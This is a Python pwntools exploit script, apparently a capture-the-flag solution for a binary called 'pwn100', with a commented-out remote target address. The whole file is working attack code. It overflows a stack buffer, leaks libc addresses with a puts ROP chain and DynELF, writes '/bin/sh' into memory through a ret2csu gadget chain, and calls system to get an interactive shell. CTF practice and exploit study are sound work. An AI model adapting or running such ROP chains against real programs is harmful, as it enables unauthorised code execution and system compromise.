from pwn import *
from time import sleep

p=process('pwn100')
#p=remote('111.198.29.45',30724)
elf=ELF('pwn100')

got_read=elf.got["read"]
plt_puts=elf.symbols['puts']
return_addr=0x400550
pop_rdi=0x400763
binsh_addr=0x601060
gadget1=0x40075a
gadget2=0x400740

print "got_read:"+hex(got_read)
print "plt_put:"+hex(plt_puts)

def leak(address):
    count = 0
    data = ''
    payload = "\x00" * 64 + "\x00" * 8
    payload += p64(pop_rdi) + p64(address)
    payload += p64(plt_puts)
    payload += p64(return_addr)
    payload = payload.ljust(200, "B")
    p.send(payload)
    p.recvuntil('bye~\n')
    up = ""
    while True:
        c = p.recv(numb=1, timeout=0.1)
        count += 1
        if up == '\n' and c == "":
            data = data[:-1]
            data += "\x00"
            break
        else:
            data += c
        up = c
    data = data[:4]
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data


d = DynELF(leak,elf=elf)
system_addr = d.lookup('system','libc')
print "system_addr="+hex(system_addr)


payload='a'*72
payload+=p64(gadget1)
payload+=p64(0)      #rbx=0
payload+=p64(1)      #rbp=1  call 
payload+=p64(got_read)	# read
payload+=p64(8)		#read size
payload+=p64(binsh_addr)	
payload+=p64(0)		#r15 read canshu
payload+=p64(gadget2)
payload+='\x00'*56
payload+=p64(return_addr)
payload=payload.ljust(200,'a')

print "#######send payload1########"

p.send(payload)
sleep(1)
p.recvuntil('bye~\n')
p.send("/bin/sh\x00")




payload2 = "\x00" * 72
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)
payload2 = payload2.ljust(200, "B")


print "#######send payload2########"
p.send(payload2)
#gdb.attach(p)
p.interactive()

